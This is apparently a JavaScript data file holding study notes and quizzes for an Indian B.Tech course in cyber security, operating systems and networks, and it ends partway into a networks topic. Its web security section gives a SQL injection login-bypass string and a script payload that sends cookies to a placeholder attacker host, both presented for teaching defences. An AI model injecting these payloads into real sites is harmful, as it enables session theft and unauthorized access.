// KHEL GAYA B.TECH CURRICULUM DATA (ASTU 5TH SEMESTER)
var DEFAULT_CURRICULUM = window.DEFAULT_CURRICULUM = {
  "version": "2.0.0",
  "institution": "Assam Science and Technology University (ASTU)",
  "semester": "5th Semester B.Tech CSE",
  "subjects": [
    {
      "id": "cyber",
      "code": "CS241505",
      "title": "Cyber Security",
      "icon": "\ud83d\udee1\ufe0f",
      "modules": [
        {
          "id": "m1",
          "num": 1,
          "title": "Fundamentals of Information Security",
          "topics": [
            {
              "id": "cyber_cia",
              "cat": "Core",
              "title": "CIA TRIAD",
              "sub": "Confidentiality / Integrity / Availability",
              "plain": "The foundational tripod of infosec. Confidentiality stops leaks. Integrity stops tampering. Availability stops downtime.",
              "def": "The CIA Triad is the benchmark infosec model. Confidentiality prevents unauthorized disclosure. Integrity safeguards data accuracy and prevents unauthorized modification or deletion. Availability guarantees timely, dependable access for authorized entities.",
              "exam": "C = secret (prevent snooping). I = correct (prevent tampering). A = accessible (prevent denial of service).",
              "trap": "Exam Trap: Encryption alone only provides Confidentiality, NOT Integrity (adversaries can flip bits in ciphertext).",
              "example": "Confidentiality: Leaking student marks. Integrity: Changing grade from 35 to 95. Availability: SYN flood crashing exam portal.",
              "q": "A patient database is uncompromised and untampered, but a ransomware attack locked the disks so doctors cannot query records during emergency surgery. Which CIA pillar collapsed?",
              "a": "Availability. Data was neither leaked nor forged, but authorized users were denied timely access."
            },
            {
              "id": "cyber_auth_rep",
              "cat": "Core",
              "title": "AUTHENTICITY & NON-REPUDIATION",
              "sub": "Identity Proof & Accountability",
              "plain": "Authenticity verifies you are genuinely who you claim to be. Non-repudiation provides indisputable proof of an action so nobody can say 'it wasn't me!'.",
              "def": "Authenticity is the property of being genuine and verified. Non-repudiation protects against denial by one of the communicating entities of having participated in a transaction (Proof of Origin & Proof of Delivery).",
              "exam": "Authenticity = Verifying identity. Non-repudiation = Undeniable proof (requires asymmetric digital signatures).",
              "trap": "Exam Trap: Symmetric encryption CANNOT provide non-repudiation because both parties share the identical secret key and can forge each other's messages.",
              "example": "A stock trader buys shares, the price crashes, and they claim they never sent the order. A digitally signed order prevents repudiation.",
              "q": "Why can symmetric encryption (AES with a pre-shared key) NOT provide Non-Repudiation?",
              "a": "Both Alice and Bob possess the exact same secret key. Either party could create the ciphertext and blame the other. Only asymmetric digital signatures provide non-repudiation."
            },
            {
              "id": "cyber_passive",
              "cat": "Attacks",
              "title": "PASSIVE ATTACKS",
              "sub": "Traffic Analysis & Eavesdropping",
              "plain": "Silent snooping. The attacker never modifies system data\u2014they just observe or analyze metadata patterns. Nearly impossible to detect, so defense focuses on prevention.",
              "def": "Passive attacks are in the nature of eavesdropping on or monitoring transmissions. Goal: obtain transmitted information without altering system resources. 2 types: 1) Release of message contents, 2) Traffic Analysis.",
              "exam": "Passive = 'I listen / I read.' Hard to detect -> Defense must PREVENT via encryption & traffic padding.",
              "trap": "Exam Trap: Traffic analysis works even if traffic is encrypted by observing packet sizes, timing, and transmission frequency.",
              "example": "Sniffing cleartext credentials on coffee shop Wi-Fi or monitoring spikes in military encrypted radio communications.",
              "q": "An adversary cannot decrypt messages between two branches, but observes a huge surge in packet traffic every Monday at 9 AM. What attack is this?",
              "a": "Traffic Analysis (a Passive Attack). The attacker deduces intelligence from communication metadata and patterns without altering packets."
            },
            {
              "id": "cyber_active",
              "cat": "Attacks",
              "title": "ACTIVE ATTACKS",
              "sub": "Masquerade, Replay, Modification, DoS",
              "plain": "Attacker interferes with data or systems. They tamper with packets, impersonate others, duplicate transactions, or crash services. Focus is on detection and recovery.",
              "def": "Active attacks involve modification of data streams or creation of false streams. 4 categories: 1) Masquerade (spoofing), 2) Replay (retransmitting captured valid packets), 3) Modification of messages, 4) Denial of Service (DoS).",
              "exam": "Active = 'I modify / I disrupt.' 4 types: Masquerade, Replay, Modification, DoS. Focus: DETECTION & RECOVERY.",
              "trap": "Exam Trap: In a replay attack, the attacker does NOT need to decrypt the captured packet! They simply resend the valid encrypted payload.",
              "example": "Capturing an encrypted fund transfer authorization and replaying it 5 times to duplicate the payment.",
              "q": "An attacker captures an encrypted wire transfer request and replays it 10 times to withdraw money repeatedly. What active attack is this?",
              "a": "A Replay Attack. It retransmits previously valid captured data to produce an unauthorized duplicated effect."
            },
            {
              "id": "cyber_services",
              "cat": "Services & Mechanisms",
              "title": "X.800 SECURITY SERVICES",
              "sub": "The 'WHAT' \u2014 Protection Objectives",
              "plain": "A policy declaration of what needs to be protected: Authentication, Access Control, Confidentiality, Integrity, Non-Repudiation.",
              "def": "A processing or communication service provided by a system to afford a specific measure of protection to resources. ITU-T X.800 defines 5 major classes: Authentication, Access Control, Data Confidentiality, Data Integrity, and Non-Repudiation.",
              "exam": "Service = THE WHAT (the security policy/objective). Never confuse with Mechanism.",
              "trap": "Exam Trap: Saying 'Encryption is a security service' is WRONG. Encryption is a mechanism; Data Confidentiality is the service.",
              "example": "Mandating that bank transactions must guarantee Data Confidentiality and Non-Repudiation.",
              "q": "What is the fundamental difference between an X.800 Security Service and a Security Mechanism?",
              "a": "A Security Service defines WHAT protection is desired (the goal). A Security Mechanism defines HOW that protection is implemented technically (the algorithm/control)."
            },
            {
              "id": "cyber_mechanisms",
              "cat": "Services & Mechanisms",
              "title": "X.800 SECURITY MECHANISMS",
              "sub": "The 'HOW' \u2014 Technical Controls",
              "plain": "The actual technical tools: AES, RSA, Hashes, Firewalls, Traffic Padding, Notarization.",
              "def": "Technical procedures, algorithms, and devices used to implement security services. Divided into: 1) Specific mechanisms (encipherment, digital signatures, access control, data integrity, authentication exchange, traffic padding, routing control, notarization), and 2) Pervasive mechanisms (audit trails, security recovery).",
              "exam": "Mechanism = THE HOW (Encipherment, Hashing, Digital Signatures, Traffic Padding).",
              "trap": "Exam Trap: Traffic padding is a mechanism, NOT a service. It implements traffic-flow confidentiality.",
              "example": "Using AES-256 encipherment and SHA-256 HMAC as mechanisms to implement confidentiality and integrity.",
              "q": "Which X.800 specific mechanism protects against passive Traffic Analysis?",
              "a": "Traffic Padding (sending continuous spurious ciphertext so adversaries cannot identify when real data flows)."
            }
          ],
          "quiz": [
            {
              "q": "A hacker intercepts and reads private military communications without altering any bit. Which CIA property is breached, and what is the attack type?",
              "opts": [
                "Integrity; Active attack",
                "Confidentiality; Passive attack",
                "Availability; Active attack",
                "Authenticity; Passive attack"
              ],
              "ans": 1,
              "cat": "CIA / Attacks",
              "correctFb": "Reading data violates Confidentiality. Because transmitted bits remain untouched, it is a Passive attack.",
              "distractors": [
                "Integrity requires data tampering.",
                "Availability relates to denial of service.",
                "Authenticity relates to identity spoofing."
              ]
            },
            {
              "q": "Which of the following is an ACTIVE attack?",
              "opts": [
                "Eavesdropping on HTTP",
                "Traffic Analysis",
                "Replay Attack",
                "Port scanning without payloads"
              ],
              "ans": 2,
              "cat": "Attacks",
              "correctFb": "Replay attacks inject captured packets into the network to alter state or duplicate effects.",
              "distractors": [
                "Eavesdropping is passive.",
                "Traffic analysis is passive observation.",
                "Port scanning is passive reconnaissance."
              ]
            }
          ]
        },
        {
          "id": "m2",
          "num": 2,
          "title": "Cryptography and Network Security",
          "topics": [
            {
              "id": "cyber_sym_asym",
              "cat": "Cryptography",
              "title": "SYMMETRIC VS ASYMMETRIC CIPHERS",
              "sub": "Secret Key (AES) vs Public Key (RSA)",
              "plain": "Symmetric uses 1 shared key for both locking and unlocking (super fast). Asymmetric uses a public key to encrypt and a private key to decrypt (solves key exchange).",
              "def": "Symmetric ciphers (AES, DES) share a single key between sender and receiver. Asymmetric ciphers (RSA, ECC) use mathematically related pairs of keys (public and private).",
              "exam": "Symmetric: Fast, high throughput, key distribution challenge. Asymmetric: Slower, solves key distribution, provides digital signatures.",
              "trap": "Exam Trap: HTTPS uses Hybrid Cryptography (asymmetric to exchange symmetric session key, then AES for bulk data).",
              "example": "AES-GCM encrypting your TLS 1.3 stream; RSA-2048 verifying the server certificate.",
              "q": "Why does HTTPS not encrypt all web page traffic directly using RSA?",
              "a": "RSA public-key operations are computationally expensive and slow. TLS uses RSA/ECDH only to exchange a fast symmetric AES session key."
            },
            {
              "id": "cyber_rsa_math",
              "cat": "Cryptography",
              "title": "RSA PUBLIC KEY CRYPTOSYSTEM",
              "sub": "Prime Factorization & Euler Totient",
              "plain": "Multiplying two primes is fast. Finding the two original primes from their product is nearly impossible for computers.",
              "def": "RSA is based on the integer factorization problem. Modulus n = p * q. Totient phi(n) = (p-1)*(q-1). Select e coprime to phi(n). Compute d = e^-1 mod phi(n). Encryption: C = M^e mod n. Decryption: M = C^d mod n.",
              "exam": "Trapdoor function: Factorization of n. Public key = (e, n); Private key = (d, n).",
              "trap": "Exam Trap: If an attacker factors n into p and q, they can immediately compute phi(n) and derive private key d.",
              "example": "SSH authentication and TLS certificate signing.",
              "q": "In RSA, given primes p=5 and q=7, what is the value of Euler's totient phi(n)?",
              "a": "phi(n) = (p - 1) * (q - 1) = 4 * 6 = 24."
            },
            {
              "id": "cyber_hashes_mac",
              "cat": "Cryptography",
              "title": "CRYPTOGRAPHIC HASHES & HMAC",
              "sub": "One-Way Digests & Keyed Authentication",
              "plain": "A hash is a one-way fingerprint. A MAC is a hash combined with a secret key so only authorized parties can create it.",
              "def": "A cryptographic hash produces a fixed-size digest with pre-image resistance, second pre-image resistance, and collision resistance. An HMAC combines a hash function with a secret shared key to authenticate data origin and integrity.",
              "exam": "Hash = Integrity only. HMAC = Integrity + Authentication.",
              "trap": "Exam Trap: A standalone hash does NOT protect against active MITM who can modify data and recompute the hash.",
              "example": "API request signing using HMAC-SHA256.",
              "q": "Why is an unkeyed SHA-256 checksum insufficient to authenticate an API request against an active attacker?",
              "a": "An attacker can tamper with the request body, compute a fresh SHA-256 hash, and replace the header. A secret key is needed via HMAC."
            }
          ],
          "quiz": [
            {
              "q": "Which property ensures it is computationally infeasible to find ANY two distinct messages that hash to the exact same digest?",
              "opts": [
                "Pre-image resistance",
                "Second pre-image resistance",
                "Collision resistance",
                "Strict avalanche criterion"
              ],
              "ans": 2,
              "cat": "Cryptography",
              "correctFb": "Collision resistance guarantees that finding ANY pair of colliding inputs (x != y where H(x) == H(y)) is computationally infeasible.",
              "distractors": [
                "Pre-image resistance is one-wayness (given y, find x).",
                "Second pre-image means given x, find y != x with H(x)==H(y).",
                "Avalanche is bit flipping."
              ]
            }
          ]
        },
        {
          "id": "m3",
          "num": 3,
          "title": "Network Security",
          "topics": [
            {
              "id": "cyber_firewalls",
              "cat": "Network Security",
              "title": "FIREWALLS: PACKET FILTER VS STATEFUL VS PROXY",
              "sub": "Layer 3/4 Filtering vs Application Inspection",
              "plain": "Packet filters check port & IP in isolation. Stateful firewalls remember connection states (SYN/ACK). Proxy firewalls inspect the full application payload.",
              "def": "Packet filtering firewalls inspect headers (IP, port, protocol) independently. Stateful inspection firewalls track TCP connection state tables (ESTABLISHED, NEW). Application-level proxy firewalls act as intermediaries and inspect Layer 7 data.",
              "exam": "Packet Filter: Fast, stateless. Stateful: Tracks TCP handshake state. Application Gateway: Deep packet inspection (Layer 7).",
              "trap": "Exam Trap: Packet filtering firewalls cannot inspect payload data or detect attacks hidden in allowed ports (e.g. SQLi on port 443).",
              "example": "iptables / nftables stateful tracking on Linux; AWS WAF inspecting HTTP requests.",
              "q": "Why does a stateful inspection firewall reject a TCP packet with the ACK flag set if no prior SYN packet was observed?",
              "a": "The firewall maintains a connection state table. If the packet does not correspond to an established TCP session, it is dropped as spoofed or invalid."
            },
            {
              "id": "cyber_ipsec",
              "cat": "Network Security",
              "title": "IPSEC: AH VS ESP & TUNNEL VS TRANSPORT",
              "sub": "Network Layer Security",
              "plain": "IPsec secures IP packets. AH gives authentication and integrity. ESP adds confidentiality (encryption). Transport mode encrypts payload; Tunnel mode encrypts the whole IP packet.",
              "def": "IPsec operates at the Network Layer. Authentication Header (AH) provides data integrity and authentication. Encapsulating Security Payload (ESP) provides confidentiality, integrity, and anti-replay. Transport mode protects upper-layer payload; Tunnel mode encapsulates the entire original IP packet with a new header.",
              "exam": "AH = Integrity + Authentication (NO encryption). ESP = Encryption + Integrity. Site-to-Site VPN uses Tunnel Mode.",
              "trap": "Exam Trap: AH does NOT encrypt data! Only ESP provides confidentiality.",
              "example": "Site-to-site corporate VPN connecting branch offices across the public internet.",
              "q": "Which IPsec protocol must be chosen if data confidentiality (payload encryption) is mandatory?",
              "a": "Encapsulating Security Payload (ESP). AH does not provide encryption."
            }
          ],
          "quiz": [
            {
              "q": "Which IPsec mode encapsulates the ENTIRE original IP packet inside a brand new IP header, commonly used in Site-to-Site VPNs?",
              "opts": [
                "Transport Mode",
                "Tunnel Mode",
                "Pass-through Mode",
                "Bridge Mode"
              ],
              "ans": 1,
              "cat": "Network Security",
              "correctFb": "Tunnel Mode encapsulates the entire original IP datagram and prepends a new outer IP header for gateway-to-gateway routing.",
              "distractors": [
                "Transport mode only protects payload and keeps the original IP header.",
                "Pass-through is not an IPsec mode.",
                "Bridge is Layer 2."
              ]
            }
          ]
        },
        {
          "id": "m4",
          "num": 4,
          "title": "Web and System Security",
          "topics": [
            {
              "id": "cyber_sqli",
              "cat": "Web Security",
              "title": "SQL INJECTION (SQLi)",
              "sub": "Input Tampering & Parameterized Queries",
              "plain": "An attacker tricks the database by injecting malicious SQL code into input fields, turning user data into executable SQL commands.",
              "def": "SQL Injection occurs when untrusted user input is directly concatenated into a dynamic SQL query without validation or escaping. Defenses: Parameterized Queries (Prepared Statements), ORMs, Stored Procedures, and Principle of Least Privilege for database users.",
              "exam": "Root Cause: Mixing code with user data. Ultimate Defense: Parameterized Queries / Prepared Statements (NEVER string concatenation).",
              "trap": "Exam Trap: Blacklisting dangerous words (like DROP or OR) is ineffective because attackers bypass filters using obfuscation or encoding. Use prepared statements.",
              "example": "Inputting `' OR '1'='1` into a password field to bypass login authentication.",
              "q": "Why do Parameterized Queries (Prepared Statements) completely eliminate SQL Injection vulnerabilities?",
              "a": "The database compiles the SQL query structure in advance. User inputs are treated strictly as data literals, never as executable SQL code."
            },
            {
              "id": "cyber_xss",
              "cat": "Web Security",
              "title": "CROSS-SITE SCRIPTING (XSS)",
              "sub": "Stored, Reflected, DOM-Based",
              "plain": "Attacker injects malicious JavaScript into a web page viewed by other users, stealing session cookies or redirecting users.",
              "def": "XSS occurs when a web app includes untrusted data in a page without context-aware output encoding. 3 Types: 1) Stored (persistent in DB), 2) Reflected (payload in URL query), 3) DOM-Based (client-side JS execution). Defenses: Context-aware output encoding, Content Security Policy (CSP), HttpOnly cookies.",
              "exam": "Stored XSS = Most dangerous (saved in DB). Reflected = In link/search. HttpOnly cookie flag stops session theft via document.cookie.",
              "trap": "Exam Trap: Setting HttpOnly on cookies prevents cookie theft via XSS, but it does NOT prevent the attacker from executing unauthorized actions in the browser!",
              "example": "Posting `<script>fetch('//attacker.com?c='+document.cookie)</script>` in a forum comment.",
              "q": "What browser cookie attribute prevents malicious client-side JavaScript from accessing session tokens via document.cookie?",
              "a": "The HttpOnly flag."
            }
          ],
          "quiz": [
            {
              "q": "Which type of Cross-Site Scripting (XSS) is permanently stored inside a web application's database and served to every visiting user?",
              "opts": [
                "Reflected XSS",
                "Stored (Persistent) XSS",
                "DOM-based XSS",
                "Blind SSRF"
              ],
              "ans": 1,
              "cat": "Web Security",
              "correctFb": "Stored XSS permanently stores the malicious script on the target server (e.g. comment board), affecting anyone viewing that page.",
              "distractors": [
                "Reflected XSS requires the victim to click a malicious link.",
                "DOM-based XSS executes purely in client scripts.",
                "SSRF is server-side request forgery."
              ]
            }
          ]
        },
        {
          "id": "m5",
          "num": 5,
          "title": "Cyber Laws and Emerging Trends",
          "topics": [
            {
              "id": "cyber_it_act",
              "cat": "Cyber Laws",
              "title": "INFORMATION TECHNOLOGY ACT (INDIA)",
              "sub": "Sections 43, 66, 66B, 66E",
              "plain": "India's legal framework for cybercrime. Section 43/66 penalizes hacking and unauthorized access. Section 66E protects privacy from unauthorized image capture.",
              "def": "The Information Technology Act 2000 (amended 2008) provides legal recognition for electronic commerce and establishes penalties for cyber offenses. Section 43 penalizes damage to computer systems. Section 66 penalizes hacking (up to 3 years imprisonment or fine). Section 66E covers privacy violations.",
              "exam": "Section 43: Civil penalties for unauthorized access. Section 66: Hacking and fraudulent computer crimes.",
              "trap": "Exam Trap: Section 66A (offensive online speech) was struck down by the Supreme Court of India in the Shreya Singhal v. Union of India judgment (2015).",
              "example": "Prosecuting an insider who extracted proprietary code from an Indian IT firm under Section 66.",
              "q": "Under the Indian IT Act 2000, which section primarily penalizes computer-related offenses such as hacking with fraudulent intent?",
              "a": "Section 66 (read with Section 43)."
            }
          ],
          "quiz": [
            {
              "q": "In the landmark 2015 Shreya Singhal judgment, which controversial section of the Indian IT Act was struck down as unconstitutional?",
              "opts": [
                "Section 43",
                "Section 66",
                "Section 66A",
                "Section 65"
              ],
              "ans": 2,
              "cat": "Cyber Laws",
              "correctFb": "Section 66A was struck down by the Supreme Court because its vague wording infringed upon freedom of speech (Article 19(1)(a)).",
              "distractors": [
                "Section 43 covers civil damage to computer systems.",
                "Section 66 covers hacking.",
                "Section 65 covers tampering with source documents."
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "os",
      "code": "CS241502",
      "title": "Operating Systems",
      "icon": "\u2699\ufe0f",
      "modules": [
        {
          "id": "m1",
          "num": 1,
          "title": "OS Structures & System Calls",
          "topics": [
            {
              "id": "os_dual_mode",
              "cat": "Architecture",
              "title": "DUAL-MODE OPERATION",
              "sub": "User Mode vs Kernel Mode",
              "plain": "Hardware mode bit: Mode 0 (Kernel) has raw access to hardware. Mode 1 (User) restricts code to protect stability.",
              "def": "Hardware protection differentiating User Mode (bit 1) and Kernel Mode (bit 0). Privileged instructions (I/O, disabling interrupts) only execute in Kernel Mode.",
              "exam": "Privileged instructions executed in User Mode trigger a hardware trap.",
              "trap": "Exam Trap: User code cannot branch into kernel memory directly; it must invoke a software interrupt (trap/syscall).",
              "example": "Executing read() system call transitions from User to Kernel mode.",
              "q": "What happens if a user process attempts to execute a CLI (clear interrupt) instruction while in user mode?",
              "a": "The CPU traps to the OS kernel as an illegal instruction / privilege violation."
            },
            {
              "id": "os_monolithic_micro",
              "cat": "Architecture",
              "title": "MONOLITHIC VS MICROKERNEL",
              "sub": "Design Trade-offs",
              "plain": "Monolithic runs all OS services in kernel space (fast). Microkernel strips kernel to bare minimum and runs drivers in user space (reliable, but IPC overhead).",
              "def": "Monolithic: Core services share single address space. Microkernel: Minimal kernel primitives; drivers and servers run in user space communicating via IPC.",
              "exam": "Linux is Monolithic with LKMs. QNX and Minix are Microkernels.",
              "trap": "Exam Trap: Microkernels have higher context switch and IPC overhead due to message passing between user-space servers.",
              "example": "A crashed driver in a microkernel restarts without bringing down the OS.",
              "q": "Why do microkernels experience IPC overhead compared to monolithic kernels?",
              "a": "Communication between user-space servers requires multiple context switches and kernel message copying."
            }
          ],
          "quiz": [
            {
              "q": "Which operating system architecture minimizes the kernel to core IPC and memory primitives, running drivers in user space?",
              "opts": [
                "Monolithic Kernel",
                "Microkernel",
                "Layered Kernel",
                "Hybrid Kernel"
              ],
              "ans": 1,
              "cat": "Architecture",
              "correctFb": "Microkernels keep the kernel minimal for fault isolation, moving servers into user space.",
              "distractors": [
                "Monolithic executes everything in kernel space.",
                "Layered is hierarchical.",
                "Hybrid combines both."
              ]
            }
          ]
        },
        {
          "id": "m2",
          "num": 2,
          "title": "Process Management & CPU Scheduling",
          "topics": [
            {
              "id": "os_pcb",
              "cat": "Processes",
              "title": "PROCESS STATES & PCB",
              "sub": "Process Control Block & Lifecycle",
              "plain": "A process moves through New, Ready, Running, Waiting, Terminated. The PCB stores its registers, PID, and memory map.",
              "def": "A PCB contains process state, program counter, CPU registers, scheduling info, and memory management data. Context switching saves the old PCB and loads the new one.",
              "exam": "Context switch time is pure overhead\u2014CPU does no useful computation.",
              "trap": "Exam Trap: Moving from Running to Ready is caused by timer preemption, NOT by waiting for I/O.",
              "example": "A timer interrupt invoking the dispatcher to switch processes in Round Robin.",
              "q": "What state does a process transition to when its assigned CPU time quantum expires?",
              "a": "Running -> Ready."
            },
            {
              "id": "os_sched_algos",
              "cat": "Scheduling",
              "title": "CPU SCHEDULING ALGORITHMS",
              "sub": "FCFS, SJF, SRTF, Round Robin",
              "plain": "FCFS suffers from Convoy Effect. SJF gives optimal average waiting time. Round Robin provides fair interactive response.",
              "def": "CPU scheduling selects a ready process for execution. SJF (Shortest Job First) is provably optimal for average waiting time. Round Robin allocates a fixed quantum q.",
              "exam": "Convoy Effect occurs in FCFS when short jobs wait behind a long CPU-bound process.",
              "trap": "Exam Trap: SJF can cause starvation of long jobs if shorter jobs continually arrive.",
              "example": "Interactive GUI operating systems use preemptive Priority / Multilevel Feedback Queues.",
              "q": "Which scheduling algorithm is provably optimal for minimizing average waiting time?",
              "a": "Shortest Job First (SJF) / Shortest Remaining Time First (SRTF)."
            }
          ],
          "quiz": [
            {
              "q": "What phenomenon in FCFS scheduling causes short I/O processes to wait excessively behind a single long CPU process?",
              "opts": [
                "Starvation",
                "Convoy Effect",
                "Belady's Anomaly",
                "Priority Inversion"
              ],
              "ans": 1,
              "cat": "Scheduling",
              "correctFb": "The Convoy Effect describes short processes queued behind a CPU-heavy process.",
              "distractors": [
                "Starvation is indefinite postponement.",
                "Belady's anomaly affects FIFO page replacement.",
                "Priority inversion affects synchronization."
              ]
            }
          ]
        },
        {
          "id": "m3",
          "num": 3,
          "title": "Process Synchronization & Deadlocks",
          "topics": [
            {
              "id": "os_sync",
              "cat": "Synchronization",
              "title": "CRITICAL SECTION & SEMAPHORES",
              "sub": "Mutex, Counting Semaphores & Race Conditions",
              "plain": "A race condition occurs when concurrent threads write shared memory. Semaphores use atomic wait() [P] and signal() [V] to enforce mutual exclusion.",
              "def": "The Critical Section requires: 1) Mutual Exclusion, 2) Progress, 3) Bounded Waiting. Semaphores are integer variables accessed only through atomic wait() and signal().",
              "exam": "Binary semaphore (Mutex) = 0 or 1. Counting semaphore = resource instances count.",
              "trap": "Exam Trap: Initializing a mutex semaphore to 0 causes an immediate deadlock on the very first wait().",
              "example": "Classic Producer-Consumer bounded-buffer problem.",
              "q": "What are the three essential requirements to solve the Critical Section problem?",
              "a": "1) Mutual Exclusion, 2) Progress, and 3) Bounded Waiting."
            },
            {
              "id": "os_deadlocks",
              "cat": "Deadlocks",
              "title": "DEADLOCK & BANKER'S ALGORITHM",
              "sub": "Coffman Conditions & Safe Sequences",
              "plain": "Deadlock requires 4 conditions simultaneously: Mutual Exclusion, Hold & Wait, No Preemption, Circular Wait. Banker's Algorithm avoids deadlock by ensuring the state remains Safe.",
              "def": "4 Coffman conditions: Mutual Exclusion, Hold and Wait, No Preemption, Circular Wait. Banker's Algorithm calculates Need = Max - Allocation and checks for a Safe execution sequence.",
              "exam": "Breaking ANY single Coffman condition PREVENTS deadlock. Banker's is for AVOIDANCE.",
              "trap": "Exam Trap: An Unsafe state is NOT necessarily deadlocked; it is a state that could lead to deadlock if worst-case claims occur.",
              "example": "Two threads holding locks on Account A and Account B while waiting for the other.",
              "q": "What is the difference between an Unsafe State and a Deadlocked State in Banker's Algorithm?",
              "a": "A deadlocked state is an actual deadlock. An unsafe state is not yet deadlocked, but lacks guaranteed paths to prevent deadlock if all processes demand their max claims."
            }
          ],
          "quiz": [
            {
              "q": "Which of the following is NOT one of the four necessary Coffman conditions for deadlock?",
              "opts": [
                "Mutual Exclusion",
                "Circular Wait",
                "Preemptible Resources",
                "Hold and Wait"
              ],
              "ans": 2,
              "cat": "Deadlocks",
              "correctFb": "The condition is NO PREEMPTION. Allowing preemptible resources actually prevents deadlock.",
              "distractors": [
                "Mutual exclusion is necessary.",
                "Circular wait is necessary.",
                "Hold and wait is necessary."
              ]
            }
          ]
        },
        {
          "id": "m4",
          "num": 4,
          "title": "Memory Management",
          "topics": [
            {
              "id": "os_paging_tlb",
              "cat": "Memory",
              "title": "PAGING & TRANSLATION LOOKASIDE BUFFER (TLB)",
              "sub": "Logical to Physical Address Translation",
              "plain": "Paging divides logical memory into Pages and physical memory into Frames. The TLB is a high-speed hardware cache for page table lookups.",
              "def": "Paging eliminates external fragmentation by mapping fixed-size pages to frames. TLB (Translation Lookaside Buffer) caches recent virtual-to-physical address translations. Effective Access Time (EAT) = hit_rate * (TLB + Memory) + (1 - hit_rate) * (TLB + 2*Memory).",
              "exam": "Paging suffers from Internal Fragmentation (within the last frame), but NO External Fragmentation.",
              "trap": "Exam Trap: Segmentation causes external fragmentation; Paging causes internal fragmentation.",
              "example": "x86-64 multi-level page tables with hardware TLB.",
              "q": "Why does pure Paging eliminate External Fragmentation while still experiencing Internal Fragmentation?",
              "a": "Any free physical frame can be allocated to any page (no external fragmentation), but if a process does not fill its final page, leftover space in that frame is wasted (internal fragmentation)."
            },
            {
              "id": "os_page_replacement",
              "cat": "Memory",
              "title": "PAGE REPLACEMENT & BELADY'S ANOMALY",
              "sub": "FIFO, LRU, Optimal & Thrashing",
              "plain": "When memory is full, the OS evicts a page. FIFO evicts the oldest (and can suffer from Belady's Anomaly where more frames cause more page faults!). LRU evicts the least recently used.",
              "def": "Page replacement algorithms: 1) FIFO (First-In, First-Out; exhibits Belady's Anomaly), 2) Optimal (OPT; evicts page not needed for longest future time; theoretical benchmark), 3) LRU (Least Recently Used; stack algorithm, immune to Belady's). Thrashing occurs when a process spends more time paging than executing.",
              "exam": "Belady's Anomaly: Increasing physical page frames leads to MORE page faults in FIFO.",
              "trap": "Exam Trap: LRU is a stack algorithm and can NEVER exhibit Belady's Anomaly.",
              "example": "Linux kernel page cache reclaiming pages using active and inactive LRU lists.",
              "q": "What is Belady's Anomaly in operating systems?",
              "a": "The counter-intuitive phenomenon where increasing the number of allocated page frames results in an increased number of page faults under FIFO page replacement."
            }
          ],
          "quiz": [
            {
              "q": "Which page replacement algorithm can exhibit Belady's Anomaly?",
              "opts": [
                "Least Recently Used (LRU)",
                "First-In, First-Out (FIFO)",
                "Optimal Page Replacement (OPT)",
                "LFU"
              ],
              "ans": 1,
              "cat": "Memory",
              "correctFb": "FIFO can suffer from Belady's Anomaly, where giving more memory frames actually increases the total page fault count.",
              "distractors": [
                "LRU is immune to Belady's anomaly.",
                "OPT is immune to Belady's anomaly.",
                "LFU is a frequency algorithm."
              ]
            }
          ]
        },
        {
          "id": "m5",
          "num": 5,
          "title": "File Systems and I/O Management",
          "topics": [
            {
              "id": "os_disk_scheduling",
              "cat": "Storage",
              "title": "DISK SCHEDULING: SSTF, SCAN, C-SCAN",
              "sub": "Seek Time Optimization",
              "plain": "Disk arms move across cylinders. SSTF services nearest requests (can starve distant ones). SCAN moves back and forth like an elevator. C-SCAN scans in one direction only.",
              "def": "Disk scheduling minimizes arm seek time. FCFS (simple, unoptimized), SSTF (Shortest Seek Time First; high throughput, starvation risk), SCAN (Elevator algorithm; sweeps back and forth), C-SCAN (Circular SCAN; sweeps in one direction, then jumps back).",
              "exam": "C-SCAN provides more uniform waiting times than standard SCAN because it does not double-service ends.",
              "trap": "Exam Trap: SSTF can cause starvation for tracks at outer edges if requests cluster near the center.",
              "example": "HDD controller reordering sector read requests.",
              "q": "Why does Circular SCAN (C-SCAN) provide more uniform waiting times than standard SCAN?",
              "a": "C-SCAN scans in only one direction and immediately resets without servicing requests on the return trip, ensuring all cylinders have an equal return interval."
            }
          ],
          "quiz": [
            {
              "q": "Which disk scheduling algorithm moves the disk arm in one direction servicing requests, and immediately returns to the start without servicing requests on the return pass?",
              "opts": [
                "SCAN",
                "SSTF",
                "C-SCAN",
                "LOOK"
              ],
              "ans": 2,
              "cat": "Storage",
              "correctFb": "C-SCAN (Circular SCAN) treats cylinders as a circular list, servicing in one direction only to provide uniform wait times.",
              "distractors": [
                "SCAN services requests in both directions.",
                "SSTF chooses the closest request.",
                "LOOK reverses at the last request instead of the edge."
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "cn",
      "code": "CS241503",
      "title": "Computer Networks",
      "icon": "\ud83c\udf10",
      "modules": [
        {
          "id": "m1",
          "num": 1,
          "title": "Physical Layer & Network Architecture",
          "topics": [
            {
              "id": "cn_osi_layers",
              "cat": "Architecture",
              "title": "OSI 7 LAYERS VS TCP/IP MODEL",
              "sub": "Protocol Stack Functions",
              "plain": "OSI: Physical, Data Link, Network, Transport, Session, Presentation, Application. TCP/IP merges top 3 into Application and bottom 2 into Network Interface.",
              "def": "OSI defines 7 conceptual layers. TCP/IP is the practical 4-layer internet stack: Network Access, Internet (IP), Transport (TCP/UDP), Application.",
              "exam": "Routers operate at Layer 3 (IP). Switches operate at Layer 2 (MAC). Hubs operate at Layer 1 (Bits).",
              "trap": "Exam Trap: Encapsulation adds headers as data moves DOWN the stack; decapsulation strips headers moving UP.",
              "example": "HTTP request encapsulated in TCP segment, IP packet, and Ethernet frame.",
              "q": "Which OSI layer is responsible for end-to-end process-to-process communication and reliability?",
              "a": "The Transport Layer (Layer 4)."
            }
          ],
          "quiz": [
            {
              "q": "At which layer of the OSI model does a router inspect packet headers to make forwarding decisions?",
              "opts": [
                "Data Link Layer",
                "Network Layer",
                "Transport Layer",
                "Physical Layer"
              ],
              "ans": 1,
              "cat": "Architecture",
              "correctFb": "Routers operate at the Network Layer (Layer 3), inspecting logical IP addresses.",
              "distractors": [
                "Switches operate at Data Link.",
                "Transport handles ports.",
                "Physical handles raw bits."
              ]
            }
          ]
        },
        {
          "id": "m2",
          "num": 2,
          "title": "Data Link Layer",
          "topics": [
            {
              "id": "cn_crc_error",
              "cat": "Data Link",
              "title": "CYCLIC REDUNDANCY CHECK (CRC)",
              "sub": "Polynomial Division for Error Detection",
